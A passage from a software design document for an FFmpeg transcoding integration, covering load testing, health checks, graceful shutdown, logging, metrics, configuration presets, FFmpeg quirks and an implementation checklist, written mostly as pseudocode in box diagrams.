│             result = await client.transcode({                       │
│                 input: { type: "file", path: "/fixtures/test.mp4" },│
│                 output: { type: "file", path: "/tmp/out.webm",     │
│                          videoCodec: "libvpx-vp9" },               │
│                 preset: "web-sd"                                    │
│             })                                                      │
│                                                                      │
│             expect(result.status).toBe("completed")                 │
│             expect(await exists("/tmp/out.webm")).toBe(true)        │
│                                                                      │
│             # Verify output is valid                                │
│             outInfo = await client.probe({ type: "file",           │
│                                           path: "/tmp/out.webm" }) │
│             expect(outInfo.duration).toBeCloseTo(10, 1)             │
│         })                                                          │
│     })                                                              │
│                                                                      │
│     describe("streaming", () => {                                   │
│         it("handles stream input", async () => {...})               │
│         it("handles stream output", async () => {...})              │
│         it("applies backpressure", async () => {...})               │
│     })                                                              │
│ })                                                                  │
└─────────────────────────────────────────────────────────────────────┘
```

### 5.3 Load Testing

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Load Testing                                      │
└─────────────────────────────────────────────────────────────────────┘

Load Test Scenarios:
┌─────────────────────────────────────────────────────────────────────┐
│ Scenario 1: Concurrent Probe Operations                             │
│ ─────────────────────────────────────────                           │
│ Target: 100 concurrent probes                                       │
│ Expected: < 100ms p99 latency                                       │
│                                                                      │
│ async function loadTestProbe() {                                    │
│     promises = []                                                   │
│     for (i = 0; i < 100; i++) {                                    │
│         promises.push(client.probe({ type: "file",                 │
│                                      path: "/fixtures/test.mp4" }))│
│     }                                                               │
│     results = await Promise.all(promises)                           │
│     // Measure latency distribution                                 │
│ }                                                                   │
│                                                                      │
│ Scenario 2: Queue Saturation                                        │
│ ───────────────────────────────                                     │
│ Target: 50 transcodes with maxConcurrent=4                          │
│ Expected: All complete, queue works correctly                       │
│                                                                      │
│ Scenario 3: Memory Under Load                                       │
│ ─────────────────────────────                                       │
│ Target: 10 concurrent large file transcodes                         │
│ Expected: Memory stays < 8GB total                                  │
│                                                                      │
│ Scenario 4: Long Running Stability                                  │
│ ─────────────────────────────────                                   │
│ Target: 1000 jobs over 1 hour                                       │
│ Expected: No memory leaks, stable performance                       │
└─────────────────────────────────────────────────────────────────────┘

Metrics to Collect:
┌─────────────────────────────────────────────────────────────────────┐
│ - Latency (p50, p95, p99)                                          │
│ - Memory usage over time                                            │
│ - CPU utilization                                                   │
│ - Queue depth over time                                             │
│ - Error rate                                                        │
│ - Temp disk usage                                                   │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 6. Operational Considerations

### 6.1 Health Checks

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Health Check Implementation                       │
└─────────────────────────────────────────────────────────────────────┘

FUNCTION healthCheck() -> HealthStatus:
    checks = {
        ffmpegBinary: false,
        ffprobeBinary: false,
        tempDirWritable: false,
        diskSpace: false,
        memoryAvailable: false
    }

    # Check FFmpeg binary
    TRY:
        result = execSync("ffmpeg -version")
        checks.ffmpegBinary = true
    CATCH:
        pass

    # Check FFprobe binary
    TRY:
        result = execSync("ffprobe -version")
        checks.ffprobeBinary = true
    CATCH:
        pass

    # Check temp directory
    TRY:
        testFile = path.join(config.tempDir, ".health-check")
        writeFileSync(testFile, "test")
        unlinkSync(testFile)
        checks.tempDirWritable = true
    CATCH:
        pass

    # Check disk space
    df = getDiskFree(config.tempDir)
    checks.diskSpace = df.available > 1 * 1024 * 1024 * 1024  # 1 GB

    # Check memory
    checks.memoryAvailable = os.freemem() > 512 * 1024 * 1024  # 512 MB

    allHealthy = Object.values(checks).every(v => v)

    RETURN {
        status: allHealthy ? "healthy" : "unhealthy",
        checks,
        activeJobs: jobManager.activeCount,
        queuedJobs: jobManager.queueSize,
        uptime: process.uptime()
    }

HTTP Endpoint:
┌─────────────────────────────────────────────────────────────────────┐
│ GET /health                                                         │
│                                                                      │
│ 200 OK:                                                             │
│ {                                                                   │
│   "status": "healthy",                                              │
│   "checks": {                                                       │
│     "ffmpegBinary": true,                                           │
│     "ffprobeBinary": true,                                          │
│     "tempDirWritable": true,                                        │
│     "diskSpace": true,                                              │
│     "memoryAvailable": true                                         │
│   },                                                                │
│   "activeJobs": 2,                                                  │
│   "queuedJobs": 5,                                                  │
│   "uptime": 3600                                                    │
│ }                                                                   │
│                                                                      │
│ 503 Service Unavailable (when unhealthy)                            │
└─────────────────────────────────────────────────────────────────────┘
```

### 6.2 Graceful Shutdown

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Graceful Shutdown                                 │
└─────────────────────────────────────────────────────────────────────┘

ASYNC FUNCTION shutdown(timeout: number = 30000):
    logger.info("Initiating graceful shutdown")

    # Phase 1: Stop accepting new jobs
    jobManager.stopAccepting()
    logger.info("Stopped accepting new jobs")

    # Phase 2: Wait for active jobs to complete
    deadline = Date.now() + timeout

    WHILE jobManager.activeCount > 0 AND Date.now() < deadline:
        logger.info("Waiting for jobs to complete", {
            active: jobManager.activeCount
        })
        await sleep(1000)

    # Phase 3: Force kill remaining jobs
    IF jobManager.activeCount > 0:
        logger.warn("Force killing remaining jobs", {
            count: jobManager.activeCount
        })
        await jobManager.killAll()

    # Phase 4: Cleanup temp files
    await tempFileRegistry.cleanupAll()
    logger.info("Cleaned up temp files")

    # Phase 5: Close connections
    await metricsClient.flush()
    await logger.flush()

    logger.info("Shutdown complete")

Signal Handlers:
┌─────────────────────────────────────────────────────────────────────┐
│ process.on("SIGTERM", async () => {                                │
│     await shutdown(30000)                                           │
│     process.exit(0)                                                 │
│ })                                                                  │
│                                                                      │
│ process.on("SIGINT", async () => {                                 │
│     await shutdown(5000)  # Faster for Ctrl+C                      │
│     process.exit(0)                                                 │
│ })                                                                  │
└─────────────────────────────────────────────────────────────────────┘
```

### 6.3 Logging Guidelines

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Logging Guidelines                                │
└─────────────────────────────────────────────────────────────────────┘

Log Levels and When to Use:
┌─────────────────────────────────────────────────────────────────────┐
│ Level   │ Use Case                           │ Example              │
├─────────┼────────────────────────────────────┼──────────────────────┤
│ ERROR   │ Job failures, process crashes      │ "Transcode failed"   │
│ WARN    │ Retries, approaching limits        │ "Memory at 80%"      │
│ INFO    │ Job lifecycle events               │ "Job started"        │
│ DEBUG   │ Command details, internal state    │ "Built command: ..." │
│ TRACE   │ FFmpeg stderr, detailed progress   │ "frame=100 fps=30"   │
└─────────┴────────────────────────────────────┴──────────────────────┘

Structured Logging:
┌─────────────────────────────────────────────────────────────────────┐
│ # Standard fields for all FFmpeg logs                               │
│ {                                                                   │
│   "timestamp": "2025-01-15T10:30:00Z",                             │
│   "level": "info",                                                  │
│   "module": "ffmpeg",                                               │
│   "jobId": "job-abc123",                                            │
│   "operation": "transcode",                                         │
│   "message": "Job completed",                                       │
│   "duration_ms": 45000,                                             │
│   "input_size": 104857600,                                          │
│   "output_size": 52428800,                                          │
│   "compression_ratio": 0.5                                          │
│ }                                                                   │
└─────────────────────────────────────────────────────────────────────┘

Sensitive Data Handling:
┌─────────────────────────────────────────────────────────────────────┐
│ # Never log full file paths (may contain PII)                       │
│ # Instead, log hashed or truncated paths                            │
│                                                                      │
│ FUNCTION sanitizePath(path: string) -> string:                      │
│     filename = path.basename(path)                                  │
│     IF filename.length > 20:                                        │
│         filename = filename.slice(0, 10) + "..." +                  │
│                   filename.slice(-7)                                │
│     RETURN filename                                                 │
│                                                                      │
│ # Never log FFmpeg commands with file paths in production           │
│ # Use DEBUG level only                                              │
└─────────────────────────────────────────────────────────────────────┘
```

### 6.4 Metrics Dashboard

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Key Metrics for Dashboards                        │
└─────────────────────────────────────────────────────────────────────┘

Throughput Panel:
┌─────────────────────────────────────────────────────────────────────┐
│ ┌─────────────────────────────────────────────────────────────────┐ │
│ │  Jobs per Minute                                                 │ │
│ │  ════════════════                                                │ │
│ │  rate(ffmpeg_jobs_total[1m])                                     │ │
│ │                                                                   │ │
│ │  50 │    ╭──╮                                                    │ │
│ │  40 │   ╭╯  ╰─╮    ╭─╮                                          │ │
│ │  30 │ ╭─╯     ╰────╯ ╰──────                                     │ │
│ │  20 │─╯                                                          │ │
│ │  10 │                                                            │ │
│ │     └────────────────────────────────────────                    │ │
│ └─────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────┘

Job Duration Histogram:
┌─────────────────────────────────────────────────────────────────────┐
│ histogram_quantile(0.95, ffmpeg_jobs_duration_bucket)              │
│                                                                      │
│ p50: 30s                                                            │
│ p95: 120s                                                           │
│ p99: 300s                                                           │
└─────────────────────────────────────────────────────────────────────┘

Queue Depth:
┌─────────────────────────────────────────────────────────────────────┐
│ ffmpeg_queue_depth                                                  │
│ Alert: > 20 for 5 minutes                                          │
└─────────────────────────────────────────────────────────────────────┘

Error Rate:
┌─────────────────────────────────────────────────────────────────────┐
│ rate(ffmpeg_errors_total[5m]) / rate(ffmpeg_jobs_total[5m])        │
│ Alert: > 5%                                                         │
└─────────────────────────────────────────────────────────────────────┘

Resource Usage:
┌─────────────────────────────────────────────────────────────────────┐
│ - process_resident_memory_bytes                                     │
│ - process_cpu_seconds_total                                         │
│ - ffmpeg_active_processes                                           │
│ - ffmpeg_temp_disk_usage_bytes                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 7. Configuration Refinements

### 7.1 Environment-Based Configuration

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Environment Configuration                         │
└─────────────────────────────────────────────────────────────────────┘

Development:
┌─────────────────────────────────────────────────────────────────────┐
│ FFMPEG_MAX_CONCURRENT=2                                             │
│ FFMPEG_TIMEOUT=300000          # 5 minutes                         │
│ FFMPEG_MAX_MEMORY_MB=1024      # 1 GB                              │
│ FFMPEG_LOG_LEVEL=debug                                              │
│ FFMPEG_TEMP_DIR=/tmp/ffmpeg-dev                                     │
└─────────────────────────────────────────────────────────────────────┘

Production:
┌─────────────────────────────────────────────────────────────────────┐
│ FFMPEG_MAX_CONCURRENT=8                                             │
│ FFMPEG_TIMEOUT=3600000         # 1 hour                            │
│ FFMPEG_MAX_MEMORY_MB=4096      # 4 GB                              │
│ FFMPEG_LOG_LEVEL=info                                               │
│ FFMPEG_TEMP_DIR=/data/ffmpeg-tmp                                    │
│ FFMPEG_CPU_THREADS=4                                                │
│ FFMPEG_NICE_LEVEL=10                                                │
└─────────────────────────────────────────────────────────────────────┘

High-Throughput:
┌─────────────────────────────────────────────────────────────────────┐
│ FFMPEG_MAX_CONCURRENT=16                                            │
│ FFMPEG_QUEUE_SIZE=200                                               │
│ FFMPEG_PROBE_POOL_SIZE=10                                           │
│ FFMPEG_MAX_MEMORY_MB=2048      # Per job                           │
│ FFMPEG_CPU_THREADS=2           # Per job (to share CPU)            │
└─────────────────────────────────────────────────────────────────────┘
```

### 7.2 Preset Tuning

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Preset Quality/Speed Tuning                       │
└─────────────────────────────────────────────────────────────────────┘

Speed vs Quality Presets:
┌─────────────────────────────────────────────────────────────────────┐
│ Preset      │ FFmpeg Preset │ CRF │ Speed   │ Quality │ Use Case   │
├─────────────┼───────────────┼─────┼─────────┼─────────┼────────────┤
│ ultrafast   │ ultrafast     │ 28  │ 10x     │ Low     │ Preview    │
│ fast        │ fast          │ 24  │ 4x      │ Medium  │ Quick conv │
│ balanced    │ medium        │ 22  │ 1.5x    │ Good    │ Default    │
│ quality     │ slow          │ 20  │ 0.5x    │ High    │ Final      │
│ archive     │ veryslow      │ 18  │ 0.2x    │ Best    │ Archival   │
└─────────────┴───────────────┴─────┴─────────┴─────────┴────────────┘

Adaptive Preset Selection:
┌─────────────────────────────────────────────────────────────────────┐
│ FUNCTION selectPreset(input: MediaInfo, options: Options):          │
│     # Short videos can use slower preset                            │
│     IF input.duration < 60:  # Under 1 minute                       │
│         RETURN "quality"                                            │
│                                                                      │
│     # Long videos need faster preset                                │
│     IF input.duration > 3600:  # Over 1 hour                        │
│         RETURN "fast"                                               │
│                                                                      │
│     # High queue depth -> faster preset                             │
│     IF jobManager.queueSize > 10:                                   │
│         RETURN "fast"                                               │
│                                                                      │
│     RETURN options.preset ?? "balanced"                             │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 8. Known Limitations and Workarounds

### 8.1 FFmpeg Quirks

```
┌─────────────────────────────────────────────────────────────────────┐
│                    FFmpeg Quirks and Workarounds                     │
└─────────────────────────────────────────────────────────────────────┘

1. MP4 Streaming (moov atom at end):
┌─────────────────────────────────────────────────────────────────────┐
│ Problem: MP4 moov atom at end prevents streaming                    │
│                                                                      │
│ Solution: Add -movflags +faststart                                  │
│ builder.addOutput({                                                 │
│     ...output,                                                      │
│     options: { "movflags": "+faststart" }                          │
│ })                                                                  │
└─────────────────────────────────────────────────────────────────────┘

2. Pipe Output with MP4:
┌─────────────────────────────────────────────────────────────────────┐
│ Problem: MP4 requires seekable output                               │
│                                                                      │
│ Solution: Use fragmented MP4 for pipe output                        │
│ builder.addOutput({                                                 │
│     type: "pipe",                                                   │
│     format: "mp4",                                                  │
│     options: { "movflags": "frag_keyframe+empty_moov" }            │
│ })                                                                  │
└─────────────────────────────────────────────────────────────────────┘

3. Audio-only with Video Input:
┌─────────────────────────────────────────────────────────────────────┐
│ Problem: FFmpeg may fail if video track exists but -vn not used    │
│                                                                      │
│ Solution: Always specify -vn for audio extraction                   │
│ builder.setGlobalOption("-vn")                                      │
└─────────────────────────────────────────────────────────────────────┘

4. Filter Graph with Spaces:
┌─────────────────────────────────────────────────────────────────────┐
│ Problem: Filter expressions with spaces need quoting                │
│                                                                      │
│ Solution: Use single quotes in filter, escape properly              │
│ -filter_complex "[0:v]drawtext=text='Hello World':x=10:y=10"       │
└─────────────────────────────────────────────────────────────────────┘

5. Progress Parsing Reliability:
┌─────────────────────────────────────────────────────────────────────┐
│ Problem: Progress may not appear for very short files               │
│                                                                      │
│ Solution: Set -progress flag for reliable output                    │
│ builder.setGlobalOption("-progress", "pipe:2")                     │
└─────────────────────────────────────────────────────────────────────┘

6. Variable Frame Rate (VFR):
┌─────────────────────────────────────────────────────────────────────┐
│ Problem: VFR videos may have sync issues after transcode            │
│                                                                      │
│ Solution: Force constant frame rate                                 │
│ builder.setFilter(new FilterGraph().fps(30))                       │
└─────────────────────────────────────────────────────────────────────┘
```

### 8.2 Platform-Specific Issues

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Platform-Specific Issues                          │
└─────────────────────────────────────────────────────────────────────┘

Linux:
┌─────────────────────────────────────────────────────────────────────┐
│ - Use ionice for I/O priority: ionice -c3 ffmpeg ...               │
│ - Check ulimit -n for file descriptors                              │
│ - VAAPI requires /dev/dri access                                    │
└─────────────────────────────────────────────────────────────────────┘

macOS:
┌─────────────────────────────────────────────────────────────────────┐
│ - VideoToolbox hardware encoding available                         │
│ - Use h264_videotoolbox encoder                                     │
│ - No cgroups, use process monitoring                                │
└─────────────────────────────────────────────────────────────────────┘

Docker/Kubernetes:
┌─────────────────────────────────────────────────────────────────────┐
│ - Mount temp volume for large files                                 │
│ - Set memory limits in pod spec                                     │
│ - GPU access requires nvidia-docker runtime                         │
│ - /dev/shm may need sizing for large operations                    │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 9. Refinement Checklist

### 9.1 Implementation Checklist

| Category | Item | Priority |
|----------|------|----------|
| **Performance** | | |
| | Process pool for probes | Medium |
| | Backpressure handling | High |
| | Hardware acceleration detection | Low |
| | Parallel segment processing | Low |
| **Security** | | |
| | Command injection prevention | High |
| | Path traversal validation | High |
| | Resource limits enforcement | High |
| | Temp file security | Medium |
| **Reliability** | | |
| | Timeout handling | High |
| | Memory pressure detection | Medium |
| | Disk space monitoring | Medium |
| | Graceful shutdown | High |
| **Testing** | | |
| | Unit test coverage > 80% | High |
| | Integration test suite | High |
| | Load testing | Medium |
| **Operations** | | |
| | Health check endpoint | High |
| | Structured logging | High |
| | Metrics dashboard | Medium |
| | Alerting rules | Medium |

---

## 10. Summary

This refinement phase addresses critical production concerns:

1. **Performance**: Process pooling, buffer management, and hardware acceleration options
2. **Security**: Command injection prevention, path validation, and resource isolation
3. **Reliability**: Comprehensive error handling, resource exhaustion detection, and graceful shutdown
4. **Testing**: Unit, integration, and load testing strategies
5. **Operations**: Health checks, logging, metrics, and monitoring guidelines

The FFmpeg integration is now production-ready with enterprise-grade safeguards.
